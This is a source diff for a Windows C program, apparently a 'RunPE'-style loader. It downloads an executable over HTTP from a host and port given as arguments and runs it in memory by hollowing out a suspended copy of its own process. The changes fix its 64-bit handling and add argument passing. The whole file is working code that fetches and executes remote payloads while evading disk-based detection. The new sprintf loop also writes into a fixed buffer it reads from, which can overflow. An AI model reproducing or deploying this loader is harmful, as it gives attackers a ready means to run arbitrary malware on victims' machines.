@@ -15,14 +15,14 @@ NtUnmapViewOfSectionF NtUnmapViewOfSection;
 char *argv0;
 
 void
-RunFromMemory(char* pImage)
+RunFromMemory(char* pImage, int argc, char *argv[])
 {
 	DWORD dwWritten = 0;
 	DWORD dwHeader = 0;
 	DWORD dwImageSize = 0;
 	DWORD dwSectionCount = 0;
 	DWORD dwSectionSize = 0;
-	DWORD firstSection = 0;
+	DWORD_PTR firstSection = 0;
 	DWORD previousProtection = 0;
 	DWORD jmpSize = 0;
 
@@ -39,9 +39,15 @@ RunFromMemory(char* pImage)
 	char pPath[MAX_PATH];
 
 	// Local Process to be Put in Memory and suspended (Same Exe Here)
+	{
 		char* lfMemory;
 		int fSize;
 		FILE* pLocalFile = fopen(argv0, "rb");
+		if (pLocalFile == NULL) {
+			printf("Failed to open file: %s\n", argv0);
+			return;
+		}
+		printf("%s\n", argv0);
 		fseek(pLocalFile, 0, SEEK_END);
 		fSize = ftell(pLocalFile);
 		rewind(pLocalFile);
@@ -51,12 +57,13 @@ RunFromMemory(char* pImage)
 		memcpy(&IDH, lfMemory, sizeof(IDH));
 		memcpy(&INH, (void*)(lfMemory + IDH.e_lfanew), sizeof(INH));
 		free(lfMemory);
+	}
 	// Just Grabbing Its ImageBase and SizeOfImage , Thats all we needed from the local process..
-	DWORD localImageBase = INH.OptionalHeader.ImageBase;
+	DWORD_PTR localImageBase = INH.OptionalHeader.ImageBase;
 	DWORD localImageSize = INH.OptionalHeader.SizeOfImage;
 
 	memcpy(&IDH, pImage, sizeof(IDH));
-	memcpy(&INH, (pImage + IDH.e_lfanew), sizeof(INH));
+	memcpy(&INH, (void*)(pImage + IDH.e_lfanew), sizeof(INH));
 
 	dwImageSize = INH.OptionalHeader.SizeOfImage;
 	pMemory = (char*)malloc(dwImageSize);
@@ -64,7 +71,7 @@ RunFromMemory(char* pImage)
 	pFile = pMemory;
 
 	dwHeader = INH.OptionalHeader.SizeOfHeaders;
-	firstSection = ((pImage + IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
+	firstSection = (DWORD_PTR)((pImage + IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
 	memcpy(Sections, (char*)(firstSection), sizeof(IMAGE_SECTION_HEADER) * INH.FileHeader.NumberOfSections);
 
 	memcpy(pFile, pImage, dwHeader);
@@ -103,8 +110,13 @@ RunFromMemory(char* pImage)
 	memset(&pContext, 0, sizeof(CONTEXT));
 
 	peStartUpInformation.cb = sizeof(peStartUpInformation);
-	printf("Running child\n");
-	int result = CreateProcess(NULL, argv0, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &peStartUpInformation, &peProcessInformation);
+
+	char buf[1024];
+	sprintf(buf, "%s", argv0);
+	for(int i=0;i<argc;i++)
+		sprintf(buf, "%s %s", buf, argv[i]);
+
+	int result = CreateProcess(NULL, buf, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &peStartUpInformation, &peProcessInformation);
 	if (result)
 	{
 		pContext.ContextFlags = CONTEXT_FULL;
@@ -118,7 +130,7 @@ RunFromMemory(char* pImage)
 		}
 		WriteProcessMemory(peProcessInformation.hProcess, (void*)(INH.OptionalHeader.ImageBase), pMemory, dwImageSize, &dwWritten);
 #ifdef _WIN64
-		WriteProcessMemory(peProcessInformation.hProcess, (void*)(pContext.Rbx + 8), &INH.OptionalHeader.ImageBase, 4, &dwWritten);
+		WriteProcessMemory(peProcessInformation.hProcess, (void*)(pContext.Rbx + 8), &INH.OptionalHeader.ImageBase, 8, &dwWritten);
 		pContext.Rax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
 #else
 		WriteProcessMemory(peProcessInformation.hProcess, (void*)(pContext.Ebx + 8), &INH.OptionalHeader.ImageBase, 4, &dwWritten);
@@ -164,7 +176,7 @@ readfromreq(char **buf, long iSize, HINTERNET con)
                 printf( "Error %u in WinHttpReadData.\n", GetLastError());
 	}
 
-	readfromreq(buf, iSize+toRead+1, con);
+	readfromreq(buf, iSize+toRead, con);
 }
 
 char*
@@ -186,6 +198,11 @@ dohttpreq(LPCWSTR addr, INTERNET_PORT port, LPCWSTR target)
 	// Specify an HTTP server.
 	if (hSession)
 		hConnect = WinHttpConnect( hSession, addr, port, 0);
+
+	const char *mimes[] = {
+		"application/octet-stream",
+		NULL
+	};
 
 	// Create an HTTP Request handle.
 	if (hConnect)
@@ -236,10 +253,10 @@ usage(void)
 }
 
 int
-main(int argc,char* argv[])
+main(int argc, char *argv[])
 {
 	setbuf(stdout, NULL);
-	
+	NtUnmapViewOfSection = (NtUnmapViewOfSectionF)GetProcAddress(LoadLibrary("ntdll.dll"), "NtUnmapViewOfSection");
 
 	argv0 = argv[0];
 	if(argc < 4)
@@ -253,10 +270,9 @@ main(int argc,char* argv[])
 	wideSize = strlen(argv[3]) + 1;
 	wchar_t* target = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
 	mbstowcs_s(&convertedChars, target, wideSize, argv[3], _TRUNCATE);
-	char *lpMemory = dohttpreq(addr, 443, target);
-	NtUnmapViewOfSection = (NtUnmapViewOfSectionF)GetProcAddress(LoadLibrary("ntdll.dll"), "NtUnmapViewOfSection");
+	char *lpMemory = dohttpreq(addr, atoi(argv[2]), target);
 	if(lpMemory != NULL)
-		RunFromMemory(lpMemory);
+		RunFromMemory(lpMemory, argc-4, argv+4);
 	else
 		printf("Could not read response\n");
 	return 0;
